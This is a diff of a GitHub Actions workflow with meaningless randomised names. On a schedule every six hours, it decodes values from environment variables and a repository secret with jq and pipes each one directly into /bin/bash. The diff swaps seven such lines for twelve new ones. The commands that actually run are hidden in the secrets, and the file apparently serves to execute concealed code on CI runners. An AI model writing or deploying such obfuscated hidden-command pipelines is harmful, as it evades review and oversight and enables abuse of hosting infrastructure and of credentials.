@@ -1,23 +1,28 @@
 name: shaobaixing3123
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 0/6 * * *'
+    - cron: '3 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: shaobaixing3123
         env:
-          rgwg77: ${{ secrets.rgwg77 }}
+          offhz3174: ${{ secrets.offhz3174 }}
         run: |
-          echo $rgwg77 | jq -r .uzyx91 | /bin/bash
-          echo $vlxve1 | jq -r .gmg0742 | /bin/bash
-          echo $rbola41 | jq -r .ync691 | /bin/bash
-          echo $jt8 | jq -r .ucv26 | /bin/bash
-          echo $rhdcw36671 | jq -r .rnt28 | /bin/bash
-          echo $e3 | jq -r .ppxm0477 | /bin/bash
-          echo $ehsqe0864 | jq -r .qnvf6 | /bin/bash
+          echo $offhz3174 | jq -r .a362 | /bin/bash
+          echo $bgrl4782 | jq -r .vyv73 | /bin/bash
+          echo $bmuck4536 | jq -r .tipmx2 | /bin/bash
+          echo $weww7 | jq -r .t262 | /bin/bash
+          echo $czdxn2527 | jq -r .wywcv6 | /bin/bash
+          echo $r80 | jq -r .afm025 | /bin/bash
+          echo $wae0883 | jq -r .tsfz4 | /bin/bash
+          echo $c3 | jq -r .iuwtl48 | /bin/bash
+          echo $da00279 | jq -r .v53 | /bin/bash
+          echo $p5 | jq -r .vdt3243 | /bin/bash
+          echo $tvkoo622 | jq -r .behhz59 | /bin/bash
+          echo $kmkf9960 | jq -r .nmq9 | /bin/bash
 
